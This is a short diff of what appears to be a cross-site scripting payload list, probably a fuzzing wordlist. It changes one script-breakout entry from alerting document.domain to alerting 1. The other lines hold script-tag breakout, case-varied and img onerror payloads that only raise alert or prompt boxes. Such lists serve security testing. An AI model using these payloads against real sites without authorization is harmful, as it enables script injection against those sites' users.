@@ -1,4 +1,4 @@
-["</script><script>alert(document.domain);</script>"]=123
+["</script><script>alert(1);</script>"]=123
 </script>"><script>prompt(1)</script>
 </ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
 "><img src=x onerror=prompt(1)>
